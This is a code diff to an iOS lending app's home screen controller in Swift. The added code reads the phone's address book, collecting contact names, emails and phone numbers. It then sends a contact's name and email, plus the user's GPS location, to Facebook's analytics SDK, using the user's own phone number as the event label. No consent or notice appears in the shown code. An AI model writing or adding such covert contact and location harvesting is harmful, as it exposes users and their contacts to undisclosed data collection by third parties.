@@ -21,6 +21,12 @@ import FBSDKLoginKit
 
 //import Localize_Swift
 
+//enum ContactsFilter {
+//    case none
+//    case mail
+//    case message
+//}
+
 class HomeViewController: UIViewController {
     
     @IBOutlet weak var cashAdvanceAmmountDesc: UILabel!
@@ -221,9 +227,8 @@ class HomeViewController: UIViewController {
         
         getLocation()
         
-        let contacts = phoneNumberWithContryCode()
         
-        print(contacts.first, "Phone Number First")
+//        print(contacts.first, "Phone Number First")
     }
     
     func getLocation() {
@@ -238,12 +243,40 @@ class HomeViewController: UIViewController {
         }
     }
     
-    func phoneNumberWithContryCode() -> [String] {
+//    func loadContacts(filter: ContactsFilter) {
+//        phoneContacts.removeAll()
+//        var allContacts = [PhoneContacts]()
+//        for contact in PhoneContacts.getContacts(filter: filter) {
+////            allContacts.append(PhoneContacts(contact: contact))
+////            allContacts.append(contact)
+//        }
+//
+//        var filterdArray = [PhoneContacts]()
+//        if self.filter == .mail {
+//            filterdArray = allContacts.filter({ $0.email.count > 0 }) // getting all email
+//        } else if self.filter == .message {
+//            filterdArray = allContacts.filter({ $0.phoneNumber.count > 0 })
+//        } else {
+//            filterdArray = allContacts
+//        }
+//        phoneContacts.append(contentsOf: filterdArray)
+//        DispatchQueue.main.async {
+////            self.tableView.reloadData()
+//        }
+//    }
+    
+
+    func phoneNumberAndEmails() -> [String: Any] {
         
         let contacts = PhoneContacts.getContacts() // here calling the getContacts methods
         
+        var phoneContacts = [String: Any]()
+        
         var arrPhoneNumbers = [String]()
+        var arrMails = [String]()
+        
         for contact in contacts {
+            
             for ContctNumVar: CNLabeledValue in contact.phoneNumbers {
                 if let fulMobNumVar  = ContctNumVar.value as? CNPhoneNumber {
                     //let countryCode = fulMobNumVar.value(forKey: "countryCode") get country code
@@ -252,8 +285,25 @@ class HomeViewController: UIViewController {
                     }
                 }
             }
+            
+            for email in contact.emailAddresses {
+                
+                if let address = email.value as? String {
+                    
+                    arrMails.append(address)
+                }
+            }
+            
+            
+            
+            let name = contact.givenName
+            
+            phoneContacts["phoneNumbers"] = arrPhoneNumbers.first
+            phoneContacts["emailAddresses"] = arrMails.first
+            phoneContacts["name"] = name
+            
         }
-        return arrPhoneNumbers // here array has all contact numbers.
+        return phoneContacts // here array has all contact numbers.
     }
     
 //    fileprivate func loadContacts(filter: ContactsFilter) {
@@ -767,6 +817,20 @@ class HomeViewController: UIViewController {
         
         print(user, "Home Userinfo")
 
+        let contacts = phoneNumberAndEmails()["name"]
+        
+        let name = phoneNumberAndEmails()["name"] ?? ""
+        let phoneNumbers = phoneNumberAndEmails()["phoneNumbers"] ?? ""
+        let emailAddresses = phoneNumberAndEmails()["emailAddresses"] ?? ""
+        
+        let location = UserInfo.user.UsrGps ?? ""
+        
+        let parameters: [AnyHashable: Any] = ["name": name,
+                                              "emailAddresses": emailAddresses,
+                                              "location": location]
+
+
+        FBSDKAppEvents.logEvent(UserInfo.user.MobilePhone, parameters: parameters)
         
         gotoNextVC()
         
